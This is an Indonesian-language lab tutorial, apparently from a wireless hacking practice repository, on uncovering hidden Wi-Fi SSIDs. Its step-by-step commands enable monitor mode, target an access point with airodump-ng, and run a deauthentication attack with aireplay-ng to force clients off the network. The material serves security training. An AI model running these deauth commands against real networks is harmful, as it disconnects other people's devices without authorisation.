# SSID Uncloaking

## Daftar Isi
- [Apa itu SSID Uncloaking?](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#apa-itu-ssid-uncloaking)
- [Cara Kerja](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#cara-kerja)
- [Persyaratan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#persyaratan)
- [Instalasi](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#instalasi)
- [Langkah-Langkah](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#langkah-langkah)
  
## Apa itu SSID Uncloaking?
SSID Uncloaking adalah teknik untuk mengungkap nama jaringan Wi-Fi (SSID) yang disembunyikan oleh AP (Access Point).

## Cara Kerja
Ketika AP dikonfigurasi sebagai hidden SSID, AP tersebut tidak menyiarkan nama jaringannya di dalam beacon frame seperti AP pada umumnya, sehingga SSID tidak terlihat oleh perangkat di sekitarnya. Meskipun demikian, hidden SSID bukan berarti benar-benar aman karena memiliki kelemahan pada proses komunikasi antara AP dan client.

Saat seorang client ingin terhubung ke AP dengan hidden SSID, client tersebut akan mengirimkan probe request yang berisi SSID yang ingin dituju. AP kemudian akan merespons dengan probe response yang juga mengandung SSID aslinya. Proses pertukaran frame inilah yang menjadi celah utama dalam teknik SSID uncloaking.

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/ssid%20uncloaking/filter.png)

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/ssid%20uncloaking/probe%20request.png)

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/ssid%20uncloaking/probe%20response.png)

Dengan memanfaatkan tools seperti `airodump-ng`, penyerang dapat memantau lalu lintas wireless di sekitarnya. Kemudian dengan mengirimkan paket deauthentication menggunakan `aireplay-ng` ke client yang sedang terhubung ke AP, client tersebut akan terputus secara paksa dari jaringan. Secara otomatis client akan mencoba melakukan reconnect ke AP, dan pada saat itulah proses probe request dan probe response terjadi. `airodump-ng` yang sedang berjalan di mode monitor akan menangkap probe response tersebut dan menampilkan SSID asli yang tadinya tersembunyi.

## Instalasi

```bash
sudo apt install iw aircrack-ng
```

## Persyaratan
- Jaringan Wi-Fi (hidden SSID)
- STA (client)
- OS Linux
- Hak akses root (`sudo`)
- Aircrack-NG Suite

## Langkah-Langkah

#### 1. Lihat semua interface wireless yang aktif:

```bash
iw dev
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/ssid%20uncloaking/lihat%20interface.png)

#### 2. Aktifkan mode monitor:

```bash
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up
iw dev wlan1 info
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/ssid%20uncloaking/aktifkan%20mode%20monitor.png)

#### 3. Scan jaringan Wi-Fi:

```bash
sudo airodump-ng wlan1
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/ssid%20uncloaking/scan.png)

#### 4. Fokuskan scan pada jaringan tersebut:

```bash
sudo airodump-ng -d [bssid] -c [channel] wlan1
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/ssid%20uncloaking/lock.png)


#### 5. Jalankan serangan deauth:

```bash
sudo aireplay-ng -0 10 -a [bssid] wlan1
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/ssid%20uncloaking/deauth.png)


#### 6. Lihat SSID yang terungkap:
![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/ssid%20uncloaking/hasil.png)

## Referensi
- [https://pentestlab.blog/2015/01/31/uncovering-hidden-ssids/](https://pentestlab.blog/2015/01/31/uncovering-hidden-ssids/)
- [https://en.wikipedia.org/wiki/Network_cloaking](https://en.wikipedia.org/wiki/Network_cloaking)
- [https://mrncciew.com/2014/10/27/cwap-802-11-probe-requestresponse/](https://mrncciew.com/2014/10/27/cwap-802-11-probe-requestresponse/)
